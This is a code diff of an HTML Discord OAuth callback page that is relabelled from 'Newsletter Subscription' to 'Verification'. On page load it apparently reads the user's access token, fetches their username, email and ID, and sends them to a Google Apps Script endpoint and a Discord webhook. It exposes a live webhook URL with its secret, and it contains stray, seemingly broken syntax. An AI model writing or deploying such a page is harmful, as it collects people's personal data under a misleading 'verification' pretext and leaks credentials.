@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Newsletter Subscription</title>
+    <title>Verification</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -41,15 +41,6 @@
         .error { color: #ef4444; font-size: 60px; margin-bottom: 20px; }
         h1 { color: #1f2937; margin-bottom: 10px; }
         p { color: #6b7280; font-size: 16px; line-height: 1.6; }
-        .email { 
-            background: #f3f4f6; 
-            padding: 10px 20px; 
-            border-radius: 10px; 
-            color: #667eea;
-            font-weight: bold;
-            display: inline-block;
-            margin: 10px 0;
-        }
         .close-btn {
             margin-top: 20px;
             padding: 12px 30px;
@@ -77,14 +68,18 @@
     </div>
 
     <script>
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1460469644077826078/1PKDg46hO1ghklAV3t1P4eRS7TxPVGJQEVcVzF5cs_6Zd1UdorCq1UIb4RtNFpNM5GJz';
+        /
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxFtyZW0Mz0tbSaWFcG3gTxkkE2cvx9zZqJYt45WoDcU2GwdBKmU_ply57q8i8lWERUDQ/exec';
+        
+      
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1460469644077826078/1PKDg46hO1ghklAV3t1P4eRS7TxPVGJQEVcVzF5cs_6Zd1UdorCq1UIb4RtNFpNM5GJz';
 
         async function handleCallback() {
             const fragment = window.location.hash.substring(1);
             const params = new URLSearchParams(fragment);
             
             const accessToken = params.get('access_token');
-            const state = params.get('state'); // This is the user ID
+            const state = params.get('state');
             
             if (!accessToken) {
                 showError('Authorization failed. No access token received.');
@@ -111,20 +106,36 @@
                     return;
                 }
 
-                // Send data to Discord webhook
-                await fetch(WEBHOOK_URL, {
+                const fullUsername = discriminator === '0' ? username : `${username}#${discriminator}`;
+
+                // Save to Google Sheets
+                await fetch(GOOGLE_SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: fullUsername,
+                        email: email,
+                        userId: id
+                    })
+                });
+
+                // Send notification to Discord webhook
+                await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
                         embeds: [{
-                            title: '📧 New Newsletter Subscription',
+                            title: '📧 New Verification',
                             color: 0x667eea,
                             fields: [
                                 {
                                     name: 'Username',
-                                    value: discriminator === '0' ? username : `${username}#${discriminator}`,
+                                    value: fullUsername,
                                     inline: true
                                 },
                                 {
@@ -140,7 +151,7 @@
                             ],
                             timestamp: new Date().toISOString(),
                             footer: {
-                                text: 'Newsletter System'
+                                text: 'Verification System'
                             }
                         }]
                     })
@@ -178,9 +189,7 @@
             document.getElementById('result').style.display = 'block';
         }
 
-        // Run on page load
         handleCallback();
     </script>
 </body>
 </html>
-*/
